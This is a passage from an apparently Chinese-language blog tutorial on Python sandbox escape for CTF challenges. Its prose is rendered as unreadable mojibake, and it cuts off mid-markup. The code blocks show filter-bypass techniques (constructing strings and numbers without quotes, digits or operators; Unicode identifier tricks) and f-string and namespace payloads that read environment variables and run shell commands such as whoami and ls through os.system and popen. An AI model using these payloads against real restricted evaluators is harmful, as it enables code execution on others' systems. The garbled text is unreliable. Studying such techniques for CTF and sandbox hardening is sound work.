class="number">109</span>]).decode()</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†-3"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†-3">#</a> è¿‡æ»¤äº† +</h4><p>è¿‡æ»¤äº† + å·ä¸»è¦å½±å“åˆ°äº†æ„é€ å­—ç¬¦ä¸²ï¼Œå‡å¦‚é¢˜ç›®è¿‡æ»¤äº†å¼•å·å’ŒåŠ å·ï¼Œæ„é€ å­—ç¬¦ä¸²è¿˜å¯ä»¥ä½¿ç”¨ join å‡½æ•°ï¼Œåˆå§‹çš„å­—ç¬¦ä¸²å¯ä»¥é€šè¿‡ str () è¿›è¡Œè·å–ã€‚å…·ä½“çš„å­—ç¬¦ä¸²å†…å®¹å¯ä»¥ä»  <code>__doc__</code>  ä¸­å–ï¼Œ</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>().join(().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>])</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†æ•°å­—"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†æ•°å­—">#</a> è¿‡æ»¤äº†æ•°å­—</h4><p>å¦‚æœè¿‡æ»¤äº†æ•°å­—çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›å‡½æ•°çš„è¿”å›å€¼è·å–ã€‚ä¾‹å¦‚ï¼š<br>0ï¼š <code>int(bool([]))</code> ã€ <code>Flase</code> ã€ <code>len([])</code> ã€ <code>any(())</code> <br>1ï¼š <code>int(bool([&quot;&quot;]))</code> ã€ <code>True</code> ã€ <code>all(())</code> ã€ <code>int(list(list(dict(aá=())).pop()).pop())</code></p><p>æœ‰äº† 0 ä¹‹åï¼Œå…¶ä»–çš„æ•°å­—å¯ä»¥é€šè¿‡è¿ç®—è¿›è¡Œè·å–ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1</span><br><span class="line">1 + 1 == 2</span><br><span class="line">2 + 1 == 3</span><br><span class="line">2 ** 2 == 4</span><br></pre></td></tr></table></figure></div><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ repr è·å–ä¸€äº›æ¯”è¾ƒé•¿å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨ len è·å–å¤§æ•´æ•°ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure></div><p>ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ len + dict + list æ¥æ„é€ ï¼Œè¿™ç§æ–¹å¼å¯ä»¥é¿å…è¿ç®—ç¬¦çš„çš„å‡ºç°</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure></div><p>ç¬¬å››ç§æ–¹æ³•: unicode</p><h4 id="è¿‡æ»¤äº†ç©ºæ ¼"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†ç©ºæ ¼">#</a> è¿‡æ»¤äº†ç©ºæ ¼</h4><p>é€šè¿‡ (),[] ä»£æ›¿</p><h4 id="è¿‡æ»¤äº†è¿ç®—ç¬¦"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†è¿ç®—ç¬¦">#</a> è¿‡æ»¤äº†è¿ç®—ç¬¦</h4><p>== å¯ä»¥ç”¨ in ä»£æ›¿</p><p>or å¯ä»¥ç”¨ | + -ã€‚ã€‚ã€‚- æ¥æ›¿æ¢</p><p>ä¾‹å¦‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure></div><p>and å¯ä»¥ç”¨ &amp; * æ›¿ä»£</p><p>ä¾‹å¦‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†-4"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†-4">#</a> è¿‡æ»¤äº† ()</h4><ol><li>åˆ©ç”¨è£…é¥°å™¨ @</li><li>åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚  <code>enum.EnumMeta.__getitem__</code></li></ol><h4 id="f-å­—ç¬¦ä¸²æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#f-å­—ç¬¦ä¸²æ‰§è¡Œ">#</a> f å­—ç¬¦ä¸²æ‰§è¡Œ</h4><p>f å­—ç¬¦ä¸²ç®—ä¸ä¸Šä¸€ä¸ªç»•è¿‡ï¼Œæ›´åƒæ˜¯ä¸€ç§æ–°çš„æ”»å‡»é¢ï¼Œé€šå¸¸æƒ…å†µä¸‹ç”¨æ¥è·å–æ•æ„Ÿä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œä¾‹å¦‚è¿‡å»ç¯å¢ƒå˜é‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line"># Access an element through several links</span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥ç›´æ¥ RCE</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">kali</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†å†…å»ºå‡½æ•°"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†å†…å»ºå‡½æ•°">#</a> è¿‡æ»¤äº†å†…å»ºå‡½æ•°</h4><h4 id="eval-list-dict-æ„é€ "><a class="markdownIt-Anchor" href="#eval-list-dict-æ„é€ ">#</a> eval + list + dict æ„é€ </h4><p>å‡å¦‚æˆ‘ä»¬åœ¨æ„é€  payload æ—¶éœ€è¦ä½¿ç”¨ str å‡½æ•°ã€bool å‡½æ•°ã€bytes å‡½æ•°ç­‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ eval è¿›è¡Œç»•è¿‡ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·å°±å¯ä»¥å°†å‡½æ•°åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„å½¢å¼ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å˜æ¢æ¥è¿›è¡Œç»•è¿‡ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·ä¸€æ¥ï¼Œåªè¦ list å’Œ dict æ²¡æœ‰è¢«ç¦ï¼Œå°±å¯ä»¥è·å–åˆ°ä»»æ„çš„å†…å»ºå‡½æ•°ã€‚å¦‚æœæŸä¸ªæ¨¡å—å·²ç»è¢«å¯¼å…¥äº†ï¼Œåˆ™ä¹Ÿå¯ä»¥è·å–è¿™ä¸ªæ¨¡å—ä¸­çš„å‡½æ•°ã€‚</p><h4 id="è¿‡æ»¤äº†-å’Œ-å¦‚ä½•è·å–å‡½æ•°"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†-å’Œ-å¦‚ä½•è·å–å‡½æ•°">#</a> è¿‡æ»¤äº†ã€‚å’Œ ï¼Œå¦‚ä½•è·å–å‡½æ•°</h4><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡ç‚¹å·æ¥è¿›è¡Œè°ƒç”¨ <code>__import__('binascii').a2b_base64</code></p><p>æˆ–è€…é€šè¿‡ getattr å‡½æ•°ï¼š <code>getattr(__import__('binascii'),'a2b_base64')</code></p><p>å¦‚æœå°†ï¼Œå·å’Œã€‚éƒ½è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥æœ‰å¦‚ä¸‹çš„å‡ ç§æ–¹å¼è·å–å‡½æ•°ï¼š</p><ol><li><p>å†…å»ºå‡½æ•°å¯ä»¥ä½¿ç”¨ <code>eval(list(dict(s_t_r=1))[0][::2])</code>  è¿™æ ·çš„æ–¹å¼è·å–ã€‚</p></li><li><p>æ¨¡å—å†…çš„å‡½æ•°å¯ä»¥å…ˆä½¿ç”¨ <code>__import__</code> å¯¼å…¥å‡½æ•°ï¼Œç„¶åä½¿ç”¨ vars () j è¿›è¡Œè·å–ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">vars</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function a2b_base64&gt;</span><br></pre></td></tr></table></figure></div></li></ol><h4 id="unicode-ç»•è¿‡"><a class="markdownIt-Anchor" href="#unicode-ç»•è¿‡">#</a> unicode ç»•è¿‡</h4><p>Python 3 å¼€å§‹æ”¯æŒé ASCII å­—ç¬¦çš„æ ‡è¯†ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥ä½¿ç”¨ Unicode å­—ç¬¦ä½œä¸º Python çš„å˜é‡åï¼Œå‡½æ•°åç­‰ã€‚Python åœ¨è§£æä»£ç æ—¶ï¼Œä½¿ç”¨çš„ Unicode Normalization Form KC (NFKC) è§„èŒƒåŒ–ç®—æ³•ï¼Œè¿™ç§ç®—æ³•å¯ä»¥å°†ä¸€äº›è§†è§‰ä¸Šç›¸ä¼¼çš„ Unicode å­—ç¬¦ç»Ÿä¸€ä¸ºä¸€ä¸ªæ ‡å‡†å½¢å¼ã€‚</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/KNHh3LtUlbfiruA.png" alt="image.png"></p><p>ç›¸ä¼¼ unicode å¯»æ‰¾ç½‘ç«™ï¼š<a class="link" href="http://shapecatcher.com/">http://shapecatcher.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>å¯ä»¥é€šè¿‡ç»˜åˆ¶çš„æ–¹å¼å¯»æ‰¾ç›¸ä¼¼å­—ç¬¦</p><p>ä¸‹åˆ’çº¿å¯ä»¥ä½¿ç”¨å¯¹åº”çš„å…¨è§’å­—ç¬¦è¿›è¡Œæ›¿æ¢ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼¿</span><br></pre></td></tr></table></figure></div><p>ä½¿ç”¨æ—¶æ³¨æ„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½ä¸ºå…¨è§’ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_ï¼¿name_ï¼¿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(ï¼¿ï¼¿name_ï¼¿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ï¼¿ï¼¿name_ï¼¿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;ï¼¿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure></div><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŸäº› unicode åœ¨é‡åˆ° lower () å‡½æ•°æ—¶ä¹Ÿä¼šå‘ç”Ÿå˜æ¢ï¼Œå› æ­¤ç¢°åˆ° lower ()ã€upper () è¿™æ ·çš„å‡½æ•°æ—¶è¦æ ¼å¤–æ³¨æ„ã€‚</strong></p><h3 id="ç»•è¿‡å‘½åç©ºé—´é™åˆ¶"><a class="markdownIt-Anchor" href="#ç»•è¿‡å‘½åç©ºé—´é™åˆ¶">#</a> ç»•è¿‡å‘½åç©ºé—´é™åˆ¶</h3><h4 id="éƒ¨åˆ†é™åˆ¶"><a class="markdownIt-Anchor" href="#éƒ¨åˆ†é™åˆ¶">#</a> éƒ¨åˆ†é™åˆ¶</h4><p>æœ‰äº›æ²™ç®±åœ¨æ„å»ºæ—¶ä½¿ç”¨ exec æ¥æ‰§è¡Œå‘½ä»¤ï¼Œexec å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æŒ‡å®šå‘½åç©ºé—´ï¼Œé€šè¿‡ä¿®æ”¹ã€åˆ é™¤å‘½åç©ºé—´ä¸­çš„å‡½æ•°åˆ™å¯ä»¥æ„å»ºä¸€ä¸ªæ²™ç®±ã€‚ä¾‹å­æ¥æºäº iscc_2016_pycalcã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div><ol><li>æ²™ç®±é¦–å…ˆè·å–  <code>__builtins__</code> ï¼Œç„¶åä¾æ®ç°æœ‰çš„  <code>__builtins__</code>  æ¥æ„å»ºå‘½åç©ºé—´ã€‚</li><li>ä¿®æ”¹  <code>__import__</code>  å‡½æ•°ä¸ºè‡ªå®šä¹‰çš„ <code>_hook_import_</code></li><li>åˆ é™¤ open å‡½æ•°é˜²æ­¢æ–‡ä»¶æ“ä½œ</li><li>exec å‘½ä»¤ã€‚</li></ol><p>ç»•è¿‡æ–¹å¼ï¼š</p><p>ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡è·å–å…¶ä»–å‘½åç©ºé—´é‡Œçš„  <code>__builtins__</code> ï¼ˆè¿™ä¸ª <code>__builtins__</code> ä¿å­˜çš„å°±æ˜¯åŸå§‹ <code>__builtins__</code> çš„å¼•ç”¨ï¼‰ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__</span><br></pre></td></tr></table></figure></div><h4 id="å®Œå…¨é™åˆ¶no-builtins"><a class="markdownIt-Anchor" href="#å®Œå…¨é™åˆ¶no-builtins">#</a> å®Œå…¨é™åˆ¶ (no builtins)</h4><p>å¦‚æœæ²™ç®±å®Œå…¨æ¸…ç©ºäº†  <code>__builtins__</code> , åˆ™æ— æ³•ä½¿ç”¨ import, å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span 